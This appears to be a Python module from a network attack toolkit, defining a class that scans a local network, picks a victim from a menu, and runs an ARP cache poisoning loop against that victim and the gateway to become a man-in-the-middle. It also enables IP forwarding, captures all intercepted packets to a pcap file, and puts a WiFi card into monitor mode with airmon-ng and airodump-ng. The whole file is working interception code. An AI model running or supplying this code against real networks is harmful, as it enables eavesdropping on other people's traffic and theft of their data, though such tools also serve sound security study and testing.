import logging
import os
import re
import time
from ipaddress import IPv4Network
from typing import Any, Dict, List, Union

import scapy.all as scapy
from scapy.layers.l2 import ARP, arping
from scapy.plist import PacketList

from .utils import Utils


# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------
class UtilsWifi:
    # Regular Expressions to be used.
    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
    wlan_code = re.compile('Interface (wlan[0-9]+|wlp[0-9]+s[0-9]+)')

    def __init__(self, utils: Utils):
        self.utils = utils


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def validate_ip(self, ip: str) -> bool:
        try:
            IPv4Network(ip)
            return True

        except Exception as e:
            logging.log(logging.WARNING, e)
        return False

    def activate_ip_forwarding(self) -> bool:
        try:
            self.utils.run_command_output_loop(
                'activate ip forward (1/2)',
                [self.utils.ctx.use_sudo + ['sysctl', '-w', 'net.ipv4.ip_forward=1']],
            )
            self.utils.run_command_output_loop(
                'activate ip forward (2/2)',
                [self.utils.ctx.use_sudo + ['sysctl', '-p', '/etc/sysctl.conf']],
            )
            return True

        except Exception as e:
            logging.log(logging.CRITICAL, e, exc_info=True)
        return False

    def deactivate_ip_forwarding(self) -> bool:
        try:
            self.utils.run_command_output_loop(
                'deactivate ip forward (1/2)',
                [self.utils.ctx.use_sudo + ['sysctl', '-w', 'net.ipv4.ip_forward=0']],
            )
            self.utils.run_command_output_loop(
                'deactivate ip forward (2/2)',
                [self.utils.ctx.use_sudo + ['sysctl', '-p', '/etc/sysctl.conf']],
            )
            return True

        except Exception as e:
            logging.log(logging.CRITICAL, e, exc_info=True)
        return False


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def scan_arp(self, net: str) -> Union[List[Dict[str, str]], None]:
        '''
            arping method in scapy
            https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py#L726-L749
        '''
        # We send arp packets through the network, verbose is set to 0 so it won't show any output.
        # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
        ans: Union[List[Any], None] = arping(
            net, verbose=self.utils.ctx.logging_verbose
        )[
            0
        ]
        if ans is not None:
            return [{'ip': res[1].psrc, 'mac': res[1].hwsrc} for res in ans]

        return None

    def gateway_info(
        self, arp_res: List[Dict[str, str]]
    ) -> Union[List[Dict[str, str]], None]:
        '''
            @arp_res is output from scan_arp
        '''
        # We run route -n and capture the output
        result: Union[str, List[str], None] = self.utils.run_command_output_loop(
            'gateway info', [self.utils.ctx.use_sudo + ['route', '-n']]
        )
        if result is not None and isinstance(result, str):
            result = result.split('\n')
            gateways: List[Dict[str, str]] = []
            # We supplied the arp_scan() results (which is a list) as an argument to the network_info parameter.
            for iface in arp_res:
                for row in result:
                    # We want the gateway information to be saved to list called gateways. We know the ip of the gateway so we can compare and see in which row it appears.
                    iface_ip = iface.get('ip', None)
                    iface_mac = iface.get('mac', None)
                    if iface_mac is not None and iface_ip is not None and iface_ip in row:
                        iface_name = self.match_iface_name(row)
                        if iface_name is not None:
                            # Once we found the gateway, we create a dictionary with all of its names.
                            gateways.append(
                                {'iface': iface_name, 'ip': iface_ip, 'mac': iface_mac}
                            )
            return gateways

        return None

    def match_iface_name(self, row: str) -> Union[str, None]:
        '''
            ...
        '''
        interface_names: List[str] = self.get_interface_names()
        # Check if the interface name is in the row. If it is then we return the iface name.
        for iface in interface_names:
            if iface in row:
                return iface

        return None

    def get_interface_names(self,) -> List[str]:
        '''
            The interface names of a networks are listed in the /sys/class/net folder in Kali. This function returns a list of interfaces in Kali.
        '''
        # The interface names are directory names in the /sys/class/net folder.
        # We use the listdir() function from the os module. Since we know there won't be files and only directories with the interface names we can save the output as the interface names.
        interface_names: List[str] = os.listdir('/sys/class/net')
        # We return the interface names which we will use to find out which one is the name of the gateway.
        return interface_names

    def get_clients(
        self, arp_res: List[Dict[str, str]], gateway_res: List[Dict[str, str]]
    ):
        '''
            This function returns a list with only the clients. The gateway is removed from the list. Generally you did get the ARP response from the gateway at the 0 index
            but I did find that sometimes this may not be the case.
            Arguments:
                - arp_res (The response from the ARP scan)
                - gateway_res (The response from the gatway_info function.)
        '''
        # In the menu we only want to give you access to the clients whose arp tables you want to poison. The gateway needs to be removed.
        client_list: List[Dict[str, str]] = []
        for gateway in gateway_res:
            for item in arp_res:
                # All items which are not the gateway will be appended to the client_list.
                if gateway.get('ip') != item.get('ip'):
                    client_list.append(item)
        # return the list with the clients which will be used for the menu.
        return client_list


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def print_arp_res(self, arp_res: List[Dict[str, str]]) -> int:
        '''
            This function creates a menu where you can pick the device whose arp cache you want to poison.
        '''
        for id, res in enumerate(arp_res):
            # We are formatting the to print the id (number in the list), the ip and lastly the mac address.
            logging.log(logging.INFO, f'{id}\t\t{res.get("ip")}\t\t{res.get("mac")}')
        while True:
            try:
                # We have to verify the choice. If the choice is valid then the function returns the choice.
                logging.log(
                    logging.INFO,
                    'Please select the ID of the computer whose ARP cache you want to poison (ctrl+c to exit): ',
                )
                choice = int(input(''))
                if arp_res[choice]:
                    return choice

            except Exception:
                logging.log(logging.WARNING, 'Please enter a valid choice!')


    # return -1
    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def send_spoof_packets(
        self, gateway_info: Dict[str, str], node_to_spoof: Dict[str, str]
    ) -> None:
        '''
            @gateway_info is from call by "gateway_info" response in list [0]
            @node_to_spoof is from call by "get_clients" and the choice from "print_arp_res"
        '''
        is_running = True
        try:
            # We need to send spoof packets to the gateway and the target device.
            while is_running:
                # We send an arp packet to the gateway saying that we are the the target machine.
                self.arp_spoofer(
                    gateway_info.get('ip'),
                    gateway_info.get('mac'),
                    node_to_spoof.get('ip'),
                )
                # We send an arp packet to the target machine saying that we are gateway.
                self.arp_spoofer(
                    node_to_spoof.get('ip'),
                    node_to_spoof.get('mac'),
                    gateway_info.get('ip'),
                )
                # Tested time.sleep() with different values. 3s seems adequate.
                time.sleep(3)
        except KeyboardInterrupt as k:
            logging.log(logging.WARNING, k)
            is_running = False
            raise KeyboardInterrupt(k)

        is_running = False

    def arp_spoofer(
        self,
        target_ip: Union[str, None],
        target_mac: Union[str, None],
        spoof_ip: Union[str, None],
    ) -> None:
        '''
            To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
            Arguments:
                - target ip address
                - target mac
                - poof ip address
        '''
        # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
        # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
        if target_ip is not None and target_mac is not None and spoof_ip is not None:
            pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
            scapy.send(pkt, verbose=False)


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def packet_sniffer(self, interface: str, path: str, filename: str) -> None:
        '''
            This function will be a packet sniffer to capture all the packets sent to the computer whilst this computer is the MITM.
        '''
        # We use the sniff function to sniff the packets going through the gateway interface. We don't store them as it takes a lot of resources. The process_sniffed_pkt is a callback function that will run on each packet.
        packets: PacketList = scapy.sniff(
            iface=interface,
            store=False,
            prn=self.process_sniffed_pkt(path=path, filename=filename),
        )

    def process_sniffed_pkt(self, path: str, filename: str):
        '''
            This function is a callback function that works with the packet sniffer. It receives every packet that goes through scapy.sniff(on_specified_interface) and writes it to a pcap file
        '''

        def upload_packet(packet):
            logging.log(logging.INFO, "Writing to pcap file. Press ctrl + c to exit.")
            # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
            scapy.wrpcap(f'{path}/{filename}.pcap', packet, append=True)

        return upload_packet


    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def find_nic(self) -> Union[List[str], None]:
        '''
            This function is used to find the network interface controllers on your computer.
        '''
        # We use the subprocess.run to run the 'sudo iw dev' command we'd normally run to find the network interfaces.
        result = self.utils.run_command_output_loop(
            'find nic', [self.utils.ctx.use_sudo + ['iw', 'dev']]
        )
        if result is not None:
            network_interface_controllers = self.wlan_code.findall(result)
            return network_interface_controllers

        return None

    def set_monitor_mode(self, wifi_name: str) -> None:
        '''
            This function needs the network interface controller name to put it into monitor mode.
            Argument: wifi_name => Network Controller Name
        '''
        # Put WiFi controller into monitor mode.
        # This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
        self.utils.run_command_output_loop(
            'monitor mode (down)',
            [self.utils.ctx.use_sudo + ['ip', 'link', 'set', wifi_name, 'down']],
        )
        # Killing conflicting processes makes sure that nothing interferes with putting controller into monitor mode.
        self.utils.run_command_output_loop(
            'monitor mode (kill)',
            [self.utils.ctx.use_sudo + ['airmon-ng', 'check', 'kill']],
        )
        # Put the WiFi nic in monitor mode.
        self.utils.run_command_output_loop(
            'monitor mode (set)',
            [self.utils.ctx.use_sudo + ['iw', wifi_name, 'set', 'monitor', 'none']],
        )
        # Bring the WiFi controller back online.
        self.utils.run_command_output_loop(
            'monitor mode (up)',
            [self.utils.ctx.use_sudo + ['ip', 'link', 'set', wifi_name, 'up']],
        )

    def set_band_to_monitor(self, choice: int, wifi_name: str) -> None:
        '''
            If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both.
        '''
        if choice == 0:
            # Bands b and g are 2.4Ghz WiFi Networks
            self.utils.run_command_output_loop(
                'band (bg)',
                [
                    self.utils.ctx.use_sudo +
                    [
                        'airodump-ng',
                        '--band',
                        'bg',
                        '-w',
                        'file',
                        '--write-interval',
                        '1',
                        '--output-format',
                        'csv',
                        wifi_name,
                    ]
                ],
            )
        elif choice == 1:
            # Band a is for 5Ghz WiFi Networks
            self.utils.run_command_output_loop(
                'band (a)',
                [
                    self.utils.ctx.use_sudo +
                    [
                        'airodump-ng',
                        '--band',
                        'a',
                        '-w',
                        'file',
                        '--write-interval',
                        '1',
                        '--output-format',
                        'csv',
                        wifi_name,
                    ]
                ],
            )
        else:
            # Will use bands a, b and g (actually band n). Checks full spectrum.
            self.utils.run_command_output_loop(
                'band (abg)',
                [
                    self.utils.ctx.use_sudo +
                    [
                        'airodump-ng',
                        '--band',
                        'abg',
                        '-w',
                        'file',
                        '--write-interval',
                        '1',
                        '--output-format',
                        'csv',
                        wifi_name,
                    ]
                ],
            )

    def set_into_managed_mode(self, wifi_name: str) -> None:
        '''
            SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
            ARGUMENTS: wifi interface name
        '''
        # Put WiFi controller into monitor mode.
        # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
        self.utils.run_command_output_loop(
            'manage mode (down',
            [self.utils.ctx.use_sudo + ['ip', 'link', 'set', wifi_name, 'down']],
        )
        # Put the WiFi nic in monitor mode.
        self.utils.run_command_output_loop(
            'manage mode (set)',
            [self.utils.ctx.use_sudo + ['iwconfig', wifi_name, 'mode', 'managed']],
        )
        self.utils.run_command_output_loop(
            'manage mode (up)',
            [self.utils.ctx.use_sudo + ['ip', 'link', 'set', wifi_name, 'up']],
        )
        self.utils.run_command_output_loop(
            'manage mode (start)',
            [self.utils.ctx.use_sudo + ['service', 'NetworkManager', 'start']],
        )
